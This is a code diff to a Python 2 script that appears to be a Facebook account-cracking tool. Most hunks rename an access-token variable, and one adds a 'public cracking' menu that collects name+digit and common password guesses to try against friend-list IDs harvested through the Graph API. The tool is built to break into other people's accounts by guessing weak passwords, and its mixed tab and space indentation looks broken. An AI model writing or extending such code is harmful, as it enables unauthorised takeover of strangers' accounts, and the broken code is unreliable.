@@ -182,7 +182,7 @@ def login():
 def menu():
 	os.system('clear')
 	try:
-		token = open('access_token.txt', 'r').read()
+		toket = open('access_token.txt', 'r').read()
 	except IOError:
 		os.system('clear')
 		print"\x1b[1;31mToken invalid"
@@ -190,7 +190,7 @@ def menu():
 		time.sleep(1)
 		methodlogin()
 	try:
-		otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
+		otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
 		a = json.loads(otw.text)
 		nama = a['name']
 		id = a['id']
@@ -239,7 +239,7 @@ def super():
 	global toket
 	os.system('clear')
 	try:
-		token=open('access_token.txt', 'r').read()
+		toket=open('access_token.txt', 'r').read()
 	except IOError:
 		print"\x1b[1;97mToken invalid"
 		time.sleep(1)
@@ -255,11 +255,24 @@ def super():
 def pilih_super():
 	peak = raw_input("\n\033[1;97mChoose Option ≻ \033[1;97m")
         if peak =="1":
+		print '\033[1;31;1m~~~~ public cracking ~~~~'
+                print ''
+                print '\033[1;93m For example: 123 , 1234 , 1234, 786 , 12 , 1122'
+                print ''
+                p1 = raw_input(' \033[1;92m[1]Name + digit: ')
+                p2 = raw_input(' \033[1;92m[2]Name + digit: ')
+                p3 = raw_input(' \033[1;92m[3]Name + digit: ')
+                pass4 = raw_input(' \033[1;92m[4]Password: ')
+		pass5 = raw_input(' \033[1;92m[5]Password: ')
+                pass6 = raw_input(' \033[1;92m[6]Password: ')
+                pass7 = raw_input(' \033[1;92m[7]Password: ')
+                pass8 = raw_input(' \033[1;92m[8]Password: ')
+                idt = raw_input(' \033[1;93m[★]Enter id: ')
 		os.system('clear')
 		logo()
 		print "\033[1;97m Please Wait"
 		jalan('\033[1;97m[✔] Getting IDs \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+ token)
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+ toket)
 		z = json.loads(r.text)
 		for s in z['data']:
 			id.append(s['id'])
@@ -281,7 +294,7 @@ def pilih_super():
                 idt = raw_input(' \033[1;93m[★]Enter id: ')
 		
 	try:
-		jok = requests.get('https://graph.facebook.com/' + idlist + '/friends?access_token=' + token)
+		jok = requests.get('https://graph.facebook.com/' + idlist + '/friends?access_token=' + toket)
 		op = json.loads(jok.text)
 		print"\033[1;97m[✔] Name\033[1;97m:\033[1;97m "+op["name"]
 	except KeyError:
@@ -289,7 +302,7 @@ def pilih_super():
 		raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 		super()
 		print"\033[1;97m[✔] Getting IDs..."
-		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
+		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
